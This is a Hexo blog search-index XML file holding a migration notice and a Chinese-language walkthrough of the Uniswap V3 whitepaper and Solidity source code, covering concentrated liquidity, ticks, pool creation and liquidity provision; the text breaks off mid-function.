<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>博客正在进行迁移，敬请期待</title>
      <link href="/2019-11-01-Hexo-Theme-Snail/"/>
      <url>/2019-11-01-Hexo-Theme-Snail/</url>
      
        <content type="html"><![CDATA[<h1 id="迁移公告"><a href="#迁移公告" class="headerlink" title="迁移公告"></a>迁移公告</h1><p>博客正在迁移，感兴趣的朋友可以去<a href="https://thomasxu-blockchain.github.io/Conract_Attack/" target="_blank" rel="noopener">老博客地址</a></p><blockquote><p>博客还未迁移完成，</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 公告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 公告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Uniswap_V3 源码分析</title>
      <link href="/uniswap-v3/"/>
      <url>/uniswap-v3/</url>
      
        <content type="html"><![CDATA[<h1 id="Uniswap-V3-源码解析（一）"><a href="#Uniswap-V3-源码解析（一）" class="headerlink" title="Uniswap V3 源码解析（一）"></a>Uniswap V3 源码解析（一）</h1><pre><code>author: Thomas_Xu</code></pre><p>之前看了v2的源码，但是感觉能写的不多，于是便决定读了v3后把v3和v2连着写一一篇博文。<br>v3版本的实现复杂度和v2已经不是一个量级了，部分算法确实难以摸透。尝试着分析分析吧。</p><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>强烈建议在阅读uniswap v3源码之前，先阅读<a href="https://uniswap.org/blog/uniswap-v3" target="_blank" rel="noopener">官方博客</a>对v3版本的介绍，有能力的话摸透V3的<a href="https://uniswap.org/whitepaper-v3.pdf" target="_blank" rel="noopener">白皮书</a>，熟悉他的实现原理。在本文中也会做出简短的介绍</p><h2 id="Uniswap-v3-白皮书导读"><a href="#Uniswap-v3-白皮书导读" class="headerlink" title="Uniswap v3 白皮书导读"></a>Uniswap v3 白皮书导读</h2><h3 id="集中流动性"><a href="#集中流动性" class="headerlink" title="集中流动性"></a>集中流动性</h3><p>其实V3最大的改变就是 <strong>“集中流动性”</strong> 这个概念，大大提高了资金的利用率。<br>早期版本旨在提供整个价格范围为(0, +∞)的流动性，这很容易实现并且可以有效地聚合流动性，但这意味着池中持有的大部分资产永远不会被触及，这使得资金的利用率很低。例如，v2版本中的DAI/USDC对仅保留约0.50%的资本用于在0.99美元和1.01美元之间进行交易，这是LP期望看到最多交易量并因此赚取最多费用的价格范围。<br><img src="uniswap02.png" alt=""><br>考虑到这一点，允许LP将其流动性集中在比(0,+∞)更小的价格范围内似乎是合理的，在Uniswap V3中将流动性集中在一个有限范围内称为头寸，一个头寸只需要保持足够的储备来支持其范围内的交易，就像V2的一个池子一样。</p><p>在Uniswap v3中，LP可以将资金集中在自定义价格范围内，以所需的价格提供更多的流动性。在此过程中，LP构建了反映其自身偏好的个性化价格曲线。<br><img src="uniswap01.png" alt=""><br>LP可以在单个池中组合任意数量的不同集中头寸。例如，ETH/DAI 池中的 LP 可以选择将 $100 分配给 $1，000-$2，000 的价格范围，并将 $50 分配给 $1，500-$1，750。</p><h3 id="资本效率"><a href="#资本效率" class="headerlink" title="资本效率"></a>资本效率</h3><p>通过集中其流动性，LP可以在指定的价格范围内提供与v2相同的流动性深度，同时将更少的资本置于风险中。节省的资金可以存放在外部，投资于不同的资产，存放在DeFi的其他地方，或用于在指定的价格范围内增加敞口以赚取更多的交易费用。<br><img src="uniswap03.png" alt=""><br><img src="uniswap04.png" alt=""></p><p>让我们举个例子来说明：</p><blockquote><p>Alice和Bob都想在Uniswap v3上的ETH/DAI池中提供流动性，他们每人有100万美元，目前ETH的价格是1500DAI。<br>Alice决定在整个价格范围内部署她的资本(就像她在Uniswap v2中一样)，于是她存入50万DAI和333.33ETH(共值100万美元)<br>Bob则建立了一个集中的仓位，只在1000到2250的价格范围内存款，他存入了91751DAI和61.17ETH，总价值约18.35万美元，他自己保留了另外的81.65万美元，按照自己的喜好进行投资。<br>此时Alice投入的资金是Bob的5.44倍，但只要ETH/DAI价格保持在1000到2250的区间内，则他们赚取的费用是一样的。</p></blockquote><p><img src="example_1.png" alt=""><br>Bob的定制仓位也是他流动资金的一种止损，如果ETH价格跌至0美元，Alice和Bob的流动资金都将完全以ETH计价，然而Bob将只损失15.9万美元，而Alice则损失100万美元，Bob可以用他额外的816,500美元来对冲下行风险，或者投资于任何其他可以想象的策略。<br><img src="example_2.png" alt=""><br>Uniswap v3中LP不需要像v2中的LP那样以较少的资本提供同等的流动性深度，而是可以选择与v2 LP一样以相同的资本量提供更大的深度，这就需要承担更多的价格风险(无常损失)，同时支持更多的交易量，赚取更高的费用.</p><h3 id="活跃的流动性"><a href="#活跃的流动性" class="headerlink" title="活跃的流动性"></a>活跃的流动性</h3><p>如果市场价格超出LP的指定价格范围，则其流动性将从池中有效移除，并且不再赚取费用。在这种状态下，LP的流动性完全由两种资产中价值较低的资产组成，直到市场价格回到其指定的价格范围，或者他们决定更新其范围以考虑当前价格。<br><img src="uniswap05.png" alt=""><br><img src="uniswap06.png" alt=""></p><h3 id="范围订单"><a href="#范围订单" class="headerlink" title="范围订单"></a>范围订单</h3><p>非常小的范围内的头寸的作用类似于限价单——如果超出范围，头寸将从完全由一种资产组成，转变为完全由另一种资产组成(加上应计费用)，这个范围指令和传统的限价指令有两个区别:</p><ul><li>一个仓位的范围有多窄是有限制的，当价格在这个范围内时，限价单可能会被部分执行</li><li>当仓位被越过时，它需要撤回，如果价格回穿该范围，则该头寸将被交易回，从而有效地逆转交易<br><img src="uniswap07.png" alt=""></li></ul><h3 id="灵活的手续费选择"><a href="#灵活的手续费选择" class="headerlink" title="灵活的手续费选择"></a>灵活的手续费选择</h3><p>v3 版本内置了三种梯度的手续费率（0.05%, 0.30%, and 1.00%），同时可以在未来增加更多的费率值。关于手续费的计算过程，这部分放在后文来详解。需要注意的是，由于需要支持多种费率，同一个代币对 v3 版本会有多个不同的流动池。例如 ETH/DAI 代币对，会分成三个池，分别对应 0.05%, 0.30%, 1.00% 的手续费。</p><h3 id="价格精度问题"><a href="#价格精度问题" class="headerlink" title="价格精度问题"></a>价格精度问题</h3><p>因为用户可以在任意 [P0,P1] 价格区间内提供流动性，Uniswap v3 需要保存每一个用户提供流动性的边界价格，即 P0 和 P1。这样就引入了一个新的问题，假设两个用户提供的流动性价格下限分别是 5.00000001 和 5.00000002，那么 Uniswap 需要标记价格为 5.00000001 和 5.00000002 的对应的流动性大小。同时当交易发生时，需要将 [5.00000001,5.00000002] 作为一个单独的价格区间进行计算。这样会导致：</p><ul><li>几乎很难有两个流动性设置相同的价格边界，这样会导致消耗大量合约存储空间保存这些状态</li><li>当进行交易计算时，价格变化被切分成很多个小的范围区间，需要逐一分段进行计算，这会消耗大量的 gas，并且如果范围的价差太小，可能会引发计算精度的问题</li></ul><p>Uniswap v3 解决这个问题的方式是，将 [Pmin,Pmax] 这一段连续的价格范围为，分割成有限个离散的价格点。每一个价格对应一个 <strong>tick</strong>，用户在设置流动性的价格区间时，只能选择这些离散的价格点中的某一个作为流动性的边界价格。<br>Uniswap v3 采用了等比数列的形式确定价格数列，公比为 1.0001。即下一个价格点为当前价格点的 100.01%。<br>如此一来 Uniswap v3 可以提供比较细粒度的价格选择范围（每个可选价格之间的差值为 0.01%），同时又可以将计算的复杂度控制在一定范围内。</p><h3 id="tick-管理"><a href="#tick-管理" class="headerlink" title="tick 管理"></a>tick 管理</h3><p>简单说，一个 tick 就代表 Uniswap 价格的等比数列中的某一个价格(公比为1.001)，因此每一个用户提供的流动性的价格边界可以用 ticklower 和 tickupper 来表示。为了计算的方便，对于每一个交易对，uni 都定义有一个价格为 1 的 tick。</p><pre><code>这样一来，只需要通过整数索引 i 就能找到对应的 tick，并且 i 为 0 时价格为 1.</code></pre><p>Uniswap 不需要记录每个 tick 所有的信息，只需要记录所有作为 upper/lower tick 所包含的流动性元数据即可。看下面这个例子：<br><img src="uniswap08.jpg" alt=""><br>两个用户分别在 [a,c] 和 [b,d] 两个区间提供了流动性 L1 和 L2，对于 Uniswap 来说它会在 a, b, c, d 四个 tick 上记录对应的流动性增减情况。例如当价格从图中从左向右移动时，代币池的流动性需要做对应的增减（即从左侧 tick 进入一个流动性时增加流动性，移出流动性的右侧 tick 时减去相应的流动性）。</p><ul><li><strong>手续费与 tick 的关系</strong><br>我们知道tick越多，价格可选的值越细，但是合约在计算时候的价格区间就可能越多，那么 gas 消耗也会更加的多，因此我们需要让 tick 的数量保持在一个合理的范围内。Uniswap 针对不同类型的代币对推荐使用不同类型的费率。<br>例如稳定比交易对 USDC/USDT，它的范围波动比较小，我们需要给它更精细的价格可选值，并且设置一个比较低的手续费（0.05%）。Uniswap 引入了 tickSpacing 的概念，即每个 tick 之间跳过 N 个 tick，这样让合约在计算的时候，gas 更可控。<br>对于价格波动较小的交易池，我们希望 tickSpacing 更小，这样价格可选值更多，同时也希望费率更低。反之波动大的交易对，可以让 tickSpacing 更大，这样更节约 gas，但是我们希望它的费率更高。</li></ul><h2 id="源码解读"><a href="#源码解读" class="headerlink" title="源码解读"></a>源码解读</h2><h3 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h3><p>v3的代码结构和v2几乎没有区别，将合约分成了两个仓库：</p><ul><li><a href="https://github.com/Uniswap/uniswap-v3-core" target="_blank" rel="noopener">uniswap-v3-core</a></li><li><a href="https://github.com/Uniswap/uniswap-v3-periphery" target="_blank" rel="noopener">uniswap-v3-periphery</a></li></ul><p>core 仓库的功能主要包含在以下 2 个合约中：</p><ul><li><p><strong>UniswapV3Factory</strong>：提供创建 pool 的接口，并且追踪所有的 pool</p></li><li><p><strong>UniswapV3Pool</strong>：实现代币交易，流动性管理，交易手续费的收取，oracle 数据管理。接口的实现粒度比较低，不适合普通用户使用，错误的调用其中的接口可能会造成经济上的损失。</p></li></ul><p>periphery仓库的功能主要包含在以下2个合约中：</p><ul><li><strong>SwapRouter</strong>：提供代币交易的接口，它是对 UniswapV3Pool 合约中交易相关接口的进一步封装，前端界面主要与这个合约来进行对接。</li><li><strong>NonfungiblePositionManager：</strong> 用来增加/移除/修改 Pool 的流动性，并且通过 NFT token 将流动性代币化。使用 ERC721 token（v2 使用的是 ERC20）的原因是同一个池的多个流动性并不能等价替换（v3 的集中流性动功能）。</li></ul><p><img src="uniswap_structur.png" alt=""><br>这是uniswap v3基本的一个架构，其主要业务流程是在Management和Pool之间进行交互。<br>NonfungiblePositionManager负责交易池的创建以及流动性的添加删除。SwapRouter是swap路由的管理。UniswapV3Factory是交易池(UniswapV3Pool)统一创建的接口。UniswapV3Pool由UniswapV3PoolDeployer统一部署。UniswapV3Pool是核心逻辑，管理了Tick和Position，实现流动性管理以及一个交易池中swap功能实现。每个Pool中的Position都做成了ERC721的Token。也就是说，每个Position都有独立的ERC721的Token ID。</p><h3 id="创建交易对"><a href="#创建交易对" class="headerlink" title="创建交易对"></a>创建交易对</h3><p>创建交易对的调用流程如下：<br><img src="uniswap_pair.png" alt=""><br>用户首先调用<code>NonfungiblePositionManager</code>合约继承的<code>createAndInitializePoolIfNecessary</code>方法创建交易对，传入的参数为交易对的 token0, token1, fee 和初始价格。</p><p>createAndInitializePoolIfNecessary 如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function createAndInitializePoolIfNecessary(</span><br><span class="line">        address token0,</span><br><span class="line">        address token1,</span><br><span class="line">        uint24 fee,</span><br><span class="line">        uint160 sqrtPriceX96</span><br><span class="line">    ) external payable override returns (address pool) &#123;</span><br><span class="line">        require(token0 &lt; token1);</span><br><span class="line">        pool &#x3D; IUniswapV3Factory(factory).getPool(token0, token1, fee);</span><br><span class="line"></span><br><span class="line">        if (pool &#x3D;&#x3D; address(0)) &#123;</span><br><span class="line">            pool &#x3D; IUniswapV3Factory(factory).createPool(token0, token1, fee);  &#x2F;&#x2F;创建pool</span><br><span class="line">            IUniswapV3Pool(pool).initialize(sqrtPriceX96);                      &#x2F;&#x2F;初始化</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            (uint160 sqrtPriceX96Existing, , , , , , ) &#x3D; IUniswapV3Pool(pool).slot0();</span><br><span class="line">            if (sqrtPriceX96Existing &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                IUniswapV3Pool(pool).initialize(sqrtPriceX96);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><code>createAndInitializePoolIfNecessary</code>方法内部通过调用 UniswapV3Factory 的 <code>createPool</code> 方法完成交易对的创建，然后对交易对进行初始化，初始化的作用就是给交易对设置一个初始的价格。</p><p>首先调用<code>UniswapV3Factory.getPool</code>方法查看交易对是否已经创建,<code>getPool</code>函数是 solidity 自动为 <code>UniswapV3Factory</code> 合约中的状态变量<code>getPool</code>生成的外部函数<code>getPool</code>的数据类型为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract UniswapV3Factory is IUniswapV3Factory, UniswapV3PoolDeployer, NoDelegateCall &#123;</span><br><span class="line">    ...</span><br><span class="line">    mapping(address &#x3D;&gt; mapping(address &#x3D;&gt; mapping(uint24 &#x3D;&gt; address))) public override getPool;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 3个 map 说明了 v3 版本使用 (tokenA, tokenB, fee) 来作为一个交易对的键，即相同代币，不同费率之间的流动池不一样。另外对于给定的 tokenA 和 tokenB，会先将其地址排序，将地址值更小的放在前，这样方便后续交易池的查询和计算。</p><p>再来看 UniswapV3Factory <strong>创建交易对的过程</strong>，实际上它是调用<code>deploy</code>函数完成交易对的创建：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function deploy(</span><br><span class="line">    address factory,</span><br><span class="line">    address token0,</span><br><span class="line">    address token1,</span><br><span class="line">    uint24 fee,</span><br><span class="line">    int24 tickSpacing</span><br><span class="line">) internal returns (address pool) &#123;</span><br><span class="line">    parameters &#x3D; Parameters(&#123;factory: factory, token0: token0, token1: token1, fee: fee, tickSpacing: tickSpacing&#125;);</span><br><span class="line">    pool &#x3D; address(new UniswapV3Pool&#123;salt: keccak256(abi.encode(token0, token1, fee))&#125;());</span><br><span class="line">    delete parameters;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里采用了<code>Create2</code>的方式创建Pool池，关于Create2的使用，可以看我的另一篇文章。<br>这里简单讲一下使用Create2的好处</p><ul><li>可以在链下计算出已经创建的交易池的地址</li><li>其他合约不必通过<code>UniswapV3Factory</code>中的接口来查询交易池的地址，可以节省 gas</li><li>合约地址不会因为 reorg 而改变</li></ul><p>我们再来看一下<code>UniswapV3Pool</code>的构造函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">constructor() &#123;</span><br><span class="line">    int24 _tickSpacing;</span><br><span class="line">    (factory, token0, token1, fee, _tickSpacing) &#x3D; IUniswapV3PoolDeployer(msg.sender).parameters();</span><br><span class="line">    tickSpacing &#x3D; _tickSpacing;</span><br><span class="line"></span><br><span class="line">    maxLiquidityPerTick &#x3D; Tick.tickSpacingToMaxLiquidityPerTick(_tickSpacing);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较值得注意的是这里反向查询了Deployer里面的<code>parameters</code>变量进行赋值，而不是通过传参的方式。<br>其实是因为Create2。这是因为<code>CREATE2</code>会将合约的 <code>initcode</code> 和 <code>salt</code> 一起用来计算创建出的合约地址。而 <code>initcode</code> 是包含 <code>contructor code</code> 和其参数的，如果合约的 <code>constructor</code> 函数包含了参数，那么其 initcode将因为其传入参数不同而不同。</p><p>为了让合约地址的计算更简单，这里的 constructor 不包含参数（这样合约的 initcode 将时唯一的），是使用动态 call 的方式来获取其创建参数。</p><p>最后，对创建的交易对合约进行初始化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function initialize(uint160 sqrtPriceX96) external override &#123;</span><br><span class="line">    require(slot0.sqrtPriceX96 &#x3D;&#x3D; 0, &#39;AI&#39;);</span><br><span class="line"></span><br><span class="line">    int24 tick &#x3D; TickMath.getTickAtSqrtRatio(sqrtPriceX96);</span><br><span class="line"></span><br><span class="line">    (uint16 cardinality, uint16 cardinalityNext) &#x3D; observations.initialize(_blockTimestamp());</span><br><span class="line"></span><br><span class="line">    slot0 &#x3D; Slot0(&#123;</span><br><span class="line">        sqrtPriceX96: sqrtPriceX96,</span><br><span class="line">        tick: tick,</span><br><span class="line">        observationIndex: 0,</span><br><span class="line">        observationCardinality: cardinality,</span><br><span class="line">        observationCardinalityNext: cardinalityNext,</span><br><span class="line">        feeProtocol: 0,</span><br><span class="line">        unlocked: true</span><br><span class="line">    &#125;);</span><br><span class="line">    &#x2F;&#x2F; 此时池子中还没有流动性</span><br><span class="line">    emit Initialize(sqrtPriceX96, tick);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>初始化主要是设置了交易池的初始价格（注意，此时池子中还没有流动性），以及费率，tick 等相关变量的初始化。完成之后一个交易池就创建好了。</p><h3 id="提供流动性"><a href="#提供流动性" class="headerlink" title="提供流动性"></a>提供流动性</h3><p>在合约内 v3会保存所有用户的流动性，代码内称作<code>Position</code>，<br><img src="uniswap10.png" alt=""><br>用户还是首先和<code>NonfungiblePositionManager</code>合约交互,调用<code>mint</code>函数，mint函数会调用<code>LiquidityManagement.sol</code>里的<code>addLiquidity</code>函数，来进行流动性的增添。v3 这次将 ERC20 的 LP token 改成了 ERC721 token，并且将 token 功能放到<code>NonfungiblePositionManager</code>合约中。这个合约替代用户完成提供流动性操作，然后根据将流动性的数据元记录下来，并给用户铸造一个 NFT Token.</p><p>我们先来看添加流动性的函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">struct AddLiquidityParams &#123;</span><br><span class="line">    address token0;     &#x2F;&#x2F; token0 的地址</span><br><span class="line">    address token1;     &#x2F;&#x2F; token1 的地址</span><br><span class="line">    uint24 fee;         &#x2F;&#x2F; 交易费率</span><br><span class="line">    address recipient;  &#x2F;&#x2F; 流动性的所属人地址</span><br><span class="line">    int24 tickLower;    &#x2F;&#x2F; 流动性的价格下限（以 token0 计价），这里传入的是 tick index</span><br><span class="line">    int24 tickUpper;    &#x2F;&#x2F; 流动性的价格上线（以 token0 计价），这里传入的是 tick index</span><br><span class="line">    uint128 amount;     &#x2F;&#x2F; 流动性 L 的值</span><br><span class="line">    uint256 amount0Max; &#x2F;&#x2F; 提供的 token0 上限数</span><br><span class="line">    uint256 amount1Max; &#x2F;&#x2F; 提供的 token1 上限数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function addLiquidity(AddLiquidityParams memory params)</span><br><span class="line">    internal</span><br><span class="line">    returns (</span><br><span class="line">        uint256 amount0,</span><br><span class="line">        uint256 amount1,</span><br><span class="line">        IUniswapV3Pool pool</span><br><span class="line">    )</span><br><span class="line">&#123;</span><br><span class="line">    PoolAddress.PoolKey memory poolKey &#x3D;</span><br><span class="line">        PoolAddress.PoolKey(&#123;token0: params.token0, token1: params.token1, fee: params.fee&#125;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 这里不需要访问 factory 合约，可以通过 token0, token1, fee 三个参数计算出 pool 的合约地址</span><br><span class="line">    pool &#x3D; IUniswapV3Pool(PoolAddress.computeAddress(factory, poolKey));</span><br><span class="line"></span><br><span class="line">    (amount0, amount1) &#x3D; pool.mint(</span><br><span class="line">        params.recipient,</span><br><span class="line">        params.tickLower,</span><br><span class="line">        params.tickUpper,</span><br><span class="line">        params.amount,</span><br><span class="line">        &#x2F;&#x2F; pool 合约回调所使用的参数</span><br><span class="line">        abi.encode(MintCallbackData(&#123;poolKey: poolKey, payer: msg.sender&#125;))</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    require(amount0 &lt;&#x3D; params.amount0Max);</span><br><span class="line">    require(amount1 &lt;&#x3D; params.amount1Max);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h4><p>在uniswap v3中有个比较特殊的设计就是在提供流动性的流程中，不是在代码逻辑内部进行token和流动性的转换，而实通过回调函数的方式进行<strong>转账</strong>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">struct MintCallbackData &#123;</span><br><span class="line">    PoolAddress.PoolKey poolKey;</span><br><span class="line">    address payer;         &#x2F;&#x2F; 支付 token 的地址</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&#x2F; @inheritdoc IUniswapV3MintCallback</span><br><span class="line">function uniswapV3MintCallback(</span><br><span class="line">    uint256 amount0Owed,</span><br><span class="line">    uint256 amount1Owed,</span><br><span class="line">    bytes calldata data</span><br><span class="line">) external override &#123;</span><br><span class="line">    MintCallbackData memory decoded &#x3D; abi.decode(data, (MintCallbackData));</span><br><span class="line">    CallbackValidation.verifyCallback(factory, decoded.poolKey);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 根据传入的参数，使用 transferFrom 代用户向 Pool 中支付 token</span><br><span class="line">    if (amount0Owed &gt; 0) pay(decoded.poolKey.token0, decoded.payer, msg.sender, amount0Owed);</span><br><span class="line">    if (amount1Owed &gt; 0) pay(decoded.poolKey.token1, decoded.payer, msg.sender, amount1Owed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>使用回调函数原因是，将<code>Position</code>的<code>owner</code>和实际流动性<code>token</code>支付者解耦。这样可以让中间合约来管理用户的流动性，并将流动性<code>token</code>化。关于<code>token</code>化，Uniswap v3 默认实现了 ERC721 token（因为即使是同一个池子，流动性之间差异也也很大）。</p><h4 id="Tick管理"><a href="#Tick管理" class="headerlink" title="Tick管理"></a>Tick管理</h4><p>Tick合约包含用于管理报价过程和相关计算的函数，下面我们进行逐一分析：</p><p>首先声明一个<code>info</code>结构体，用于存储每个初始化后个人的trick信息，具体代码如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">struct Info &#123;</span><br><span class="line">    &#x2F;&#x2F; the total position liquidity that references this tick</span><br><span class="line">    uint128 liquidityGross;</span><br><span class="line">    &#x2F;&#x2F; amount of net liquidity added (subtracted) when tick is crossed from left to right (right to left),</span><br><span class="line">    int128 liquidityNet;</span><br><span class="line">    &#x2F;&#x2F; fee growth per unit of liquidity on the _other_ side of this tick (relative to the current tick)</span><br><span class="line">    &#x2F;&#x2F; only has relative meaning, not absolute — the value depends on when the tick is initialized</span><br><span class="line">    uint256 feeGrowthOutside0X128;</span><br><span class="line">    uint256 feeGrowthOutside1X128;</span><br><span class="line">    &#x2F;&#x2F; the cumulative tick value on the other side of the tick</span><br><span class="line">    int56 tickCumulativeOutside;</span><br><span class="line">    &#x2F;&#x2F; the seconds per unit of liquidity on the _other_ side of this tick (relative to the current tick)</span><br><span class="line">    &#x2F;&#x2F; only has relative meaning, not absolute — the value depends on when the tick is initialized</span><br><span class="line">    uint160 secondsPerLiquidityOutsideX128;</span><br><span class="line">    &#x2F;&#x2F; the seconds spent on the other side of the tick (relative to the current tick)</span><br><span class="line">    &#x2F;&#x2F; only has relative meaning, not absolute — the value depends on when the tick is initialized</span><br><span class="line">    uint32 secondsOutside;</span><br><span class="line">    &#x2F;&#x2F; true iff the tick is initialized, i.e. the value is exactly equivalent to the expression liquidityGross !&#x3D; 0</span><br><span class="line">    &#x2F;&#x2F; these 8 bits are set to prevent fresh sstores when crossing newly initialized ticks</span><br><span class="line">    bool initialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>tickSpacingToMaxLiquidityPerTick</code>函数用于根据给定的tickSpacing得出每一个trick的最大流动性值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;e.g., a tickSpacing of 3 requires ticks to be initialized every 3rd tick i.e., ..., -6, -3, 0, 3, 6, ...</span><br><span class="line">&#x2F;&#x2F; @return The max liquidity per tick</span><br><span class="line">function tickSpacingToMaxLiquidityPerTick(int24 tickSpacing) internal pure returns (uint128) &#123;</span><br><span class="line">    int24 minTick &#x3D; (TickMath.MIN_TICK &#x2F; tickSpacing) * tickSpacing;</span><br><span class="line">    int24 maxTick &#x3D; (TickMath.MAX_TICK &#x2F; tickSpacing) * tickSpacing;</span><br><span class="line">    uint24 numTicks &#x3D; uint24((maxTick - minTick) &#x2F; tickSpacing) + 1;</span><br><span class="line">    return type(uint128).max &#x2F; numTicks;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>getFeeGrowthInside</code>函数用于检查费用增长的数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">function getFeeGrowthInside(</span><br><span class="line">    mapping(int24 &#x3D;&gt; Tick.Info) storage self,</span><br><span class="line">    int24 tickLower,</span><br><span class="line">    int24 tickUpper,</span><br><span class="line">    int24 tickCurrent,</span><br><span class="line">    uint256 feeGrowthGlobal0X128,</span><br><span class="line">    uint256 feeGrowthGlobal1X128</span><br><span class="line">) internal view returns (uint256 feeGrowthInside0X128, uint256 feeGrowthInside1X128) &#123;</span><br><span class="line">    Info storage lower &#x3D; self[tickLower];</span><br><span class="line">    Info storage upper &#x3D; self[tickUpper];</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; calculate fee growth below</span><br><span class="line">    uint256 feeGrowthBelow0X128;</span><br><span class="line">    uint256 feeGrowthBelow1X128;</span><br><span class="line">    if (tickCurrent &gt;&#x3D; tickLower) &#123;</span><br><span class="line">        